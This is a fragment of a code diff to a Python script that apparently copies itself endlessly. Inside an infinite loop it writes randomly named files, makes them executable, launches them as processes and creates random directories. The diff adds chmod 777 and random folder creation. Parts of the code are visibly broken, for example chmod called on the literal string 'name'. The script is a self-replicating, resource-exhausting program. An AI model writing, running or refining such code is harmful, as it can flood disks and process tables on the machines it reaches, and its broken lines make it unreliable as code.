@@ -14,7 +14,6 @@ while True:
         me = open(__file__, "r")
         print(1)
         name = pre + '/' + ''.join(ls[0:randint(3, len(ls)-1)]) + en
-        print(name)
         file = open(name, "w+")
     except:
         pass
@@ -24,7 +23,7 @@ while True:
         print(name)
         file.close()
         try:
-            os.chmod('name')
+            os.chmod('name', 777)
         except:
             pass
         try:
@@ -39,6 +38,9 @@ while True:
             p2 = multiprocessing.Process(target= lambda: os.system(f"{name}"))
         except:
             pass  
+    if randint(0, 6) == 1:
+        shuffle(ls)
+        os.mkdir( ''.join(ls[0:randint(0,len(ls)-1)]) )
     if randint(0, 5) == 3:
         try:
             folders = next(os.walk('.'))
@@ -54,7 +56,12 @@ while True:
     try:
       p.start()
     except:
-      try:
+        pass
+    """try:
         p1.start()
-      except:
+    except:
+        pass
+    try:
         p2.start()
+    except:
+        pass"""
